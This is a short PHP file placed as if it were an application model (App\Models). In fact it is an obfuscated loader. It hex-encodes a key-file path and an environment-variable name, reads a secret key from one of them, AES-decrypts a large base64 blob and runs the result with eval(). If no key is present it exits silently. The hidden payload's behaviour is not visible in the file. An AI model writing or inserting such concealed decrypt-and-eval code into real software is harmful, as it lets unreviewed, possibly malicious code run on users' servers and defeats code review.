<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('xjC54BFWcuqHGlRX5GOgMw==');

$c=base64_decode(

'FMUha0KiZVI6H0149JmVTBrv2NrE9FFsj14YoGxFefIauvPXEkUuP1GcgI6pfRAQSI03x4z4OxaW' .
'VTtiCjqVJ3ciihk68d27WRsb1tqQ6rQ7VRpinz5V0Flx8iGHuXSGpyl1gHCyyfekX4kIBVZ3wgwy' .
'7etnUubHBHp8DXQIhCO9KO2SwQHpgu0Lyr7gR+9G/6WLXvXl3K9wQjmo6Nl1I+cBA3Ur31gFHBQj' .
'8+PFcdHBA5K72HCBj5n5GwaBjI5+9lVKVvNQX7DR/cYri0+hK7iTfkCwnPEghOw+94qFHQP5H0m0' .
'125Nc0s9wEqicQLtVd4s50v1+Ph8mQeCZnRT0k0jHCMD6IErEucdcGcr5xO5lU+/UyFsiQX3+t/v' .
'yjMm5jHzmysDzMcRqv+EyLQNwDEQJLBPeIFA9sqEXO/LP0SwGq5GKkVhYTRYpfWNA8F0IjuHVdsg' .
'PMQdWsMA1Dc7YNCMCFfsBUZZpIvmsPFcyIh7oRAbPGfJ8V6iDpdQEMkoLH1ttDd8GCsawSVDVde7' .
'+Qp3o3u0NICUVDJMMl3wLwmgOXsyuW/VL1EQXOZ46loydZxdeoyDfzt5fgGdOETo57/41AEAehNw' .
'pV2GwipWOyFuTvlEq+o6ZYxrj8/JSkUYixzo3sOYiYbkrRI4cOK3wTTb6UuFT7ajSs2C59rqNEqo' .
't3Tmvx1jRE1AHUqTbWgNtHFbNm/lJi4mHm5Hfi1AMjXsngYCoZXt0joEwZKkx/mk35U0PkDQ0odd' .
'8XBSFFC/nzta7d1BQ6rMZPO5A7B1zw=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

